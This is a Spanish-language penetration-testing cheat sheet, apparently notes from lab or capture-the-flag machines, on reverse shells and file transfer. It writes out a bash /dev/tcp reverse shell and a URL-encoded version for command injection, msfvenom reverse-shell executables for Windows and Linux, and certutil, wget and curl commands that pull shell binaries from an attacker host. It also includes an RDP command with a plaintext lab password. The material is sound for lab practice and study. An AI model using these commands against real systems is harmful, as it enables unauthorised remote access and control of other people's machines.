# Shells reversas y transferencia de archivos

Comandos usados en **Academia**, **ACEITUNO**, **GOIKO**, **Chimichurri** y en las notas de Windows.

## 1. Escucha en nuestro equipo

```
nc -lvnp <PUERTO>
```

Con `rlwrap` para tener historial y flechas:

```
rlwrap nc -lvnp <PUERTO>
```

## 2. Reverse shell en Bash

Desde la víctima:

```
/bin/bash -i >& /dev/tcp/<IP_LOCAL>/<PUERTO> 0>&1
```

En una URL hay que codificarlo (`%26` = `&`, `%2F` = `/`):

```
cmd=bash -c "sh -i >%26 %2Fdev%2Ftcp%2F<IP_LOCAL>%2F<PUERTO> 0>%261"
```

## 3. Payloads con msfvenom

**Ejecutable Windows:**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_LOCAL> LPORT=<PUERTO> -f exe -o shell.exe
```

**Servicio Windows** (para servicios con rutas débiles):

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_LOCAL> LPORT=<PUERTO> -f exe-service -o svc.exe
```

**Linux:**

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP_LOCAL> LPORT=<PUERTO> -f elf -o shell.elf
```

> Ojo con los errores tipeados del propio msfvenom: `invalid payload: windows/x64/sheel_reverse_tcp` significa que el nombre del payload está mal escrito (`sheel` → `shell`).

## 4. Shell interactiva desde cualquier reverse shell

```
SHELL=/bin/bash script -q /dev/null
```

`Ctrl+Z` y recuperar la sesión:

```
stty raw -echo && fg
```

Activar `Ctrl+L` (limpiar) y el borrado de línea:

```
export TERM=xterm
```

## 5. Handler con Penelope

```
wget -q https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
```

## 6. Subir y bajar archivos

**Desde Evil-WinRM:**

```
upload /home/kali/ruta/archivo.exe
download C:\Users\<usuario>\archivo.txt
```

**Desde smbclient:**

```
get archivo.txt
put archivo.exe
```

**Con certutil** (descarga directa en Windows):

```
certutil -urlcache -split -f http://<IP_LOCAL>/shell.exe C:\Windows\Tasks\shell.exe
```

Variante corta (sin `-split`) — misma función, guardando en `c:\temp`:

```
certutil -urlcache -f http://<IP_LOCAL>/rs.exe c:\temp\rs.exe
```

- `-urlcache` → guarda la URL en caché y permite descargarla.
- `-f` → fuerza la sobrescritura si el archivo ya existe.
- La ruta de destino debe existir (`c:\temp` hay que crearlo antes con `mkdir c:\temp` si no está).
- Suele dejar un aviso en el Event Log de Windows (4104/Operational), ojo en forensics.

**Con wget / curl** (Linux):

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
curl -o archivo http://<IP_LOCAL>/archivo
```

**Unidad redirigida de RDP** (la carpeta compartida con `/drive` aparece como `TSCLIENT`):

```
net use
copy \\TSCLIENT\_share\archivo.exe C:\Windows\RUTA\archivo.exe
```

## 7. FTP anónimo

```
ftp anonymous@<IP>
```

Dentro del `ftp:`:

```
ls
get archivo.zip
prompt      # desactiva el modo interactivo
mget *      # baja todo
exit
```

## 8. Escritorio remoto (RDP)

```
xfreerdp /v:<IP> /u:<usuario> /p:'<contraseña>' /cert:ignore +clipboard /dynamic-resolution /drive:share,/share
```

Con `xfreerdp3` (FreeRDP 3.x) y un ejemplo real:

```
xfreerdp3 /v:10.220.10.20 /u:'Administrator' /p:'N3w34829DJdd?1' /cert:ignore +clipboard /dynamic-resolution
```

Explicación de cada parámetro:

| Parámetro | Qué hace |
|---|---|
| `xfreerdp3` | Binario de FreeRDP 3.x (la versión 2 se invocaba simplemente como `xfreerdp`). |
| `/v:10.220.10.20` | Dirección IP (o hostname) del servidor RDP al que conectarnos. |
| `/u:'Administrator'` | Usuario de la sesión RDP. Las comillas simples protegen caracteres especiales. |
| `/p:'N3w34829DJdd?1'` | Contraseña en claro. Ojo: queda en el historial del shell y en la lista de procesos (`ps aux`). Alternativa más segura: `/p` a secas, que pide la contraseña de forma interactiva. |
| `/cert:ignore` | Ignora la comprobación del certificado TLS del servidor (autofirmado en la mayoría de laboratorios). Equivale a aceptar el aviso de certificado no válido. |
| `+clipboard` | Habilita el portapapeles compartido: copiar y pegar entre kali y la máquina Windows (texto y, según versión, ficheros). Se desactiva con `-clipboard`. |
| `/dynamic-resolution` | La ventana se puede redimensionar y la resolución de la sesión remota se adapta en tiempo real, sin tener que fijarla con `/size` o `/f`. |
| `/drive:share,/share` | (Opcional) Comparte la carpeta local `/share` como unidad de red dentro de la sesión Windows. Muy útil para subir herramientas sin tener que montar un servidor HTTP. |

> Nota: sin `/p`, FreeRDP muestra un diálogo de credenciales o las pide por terminal, evitando que la contraseña quede en el historial.
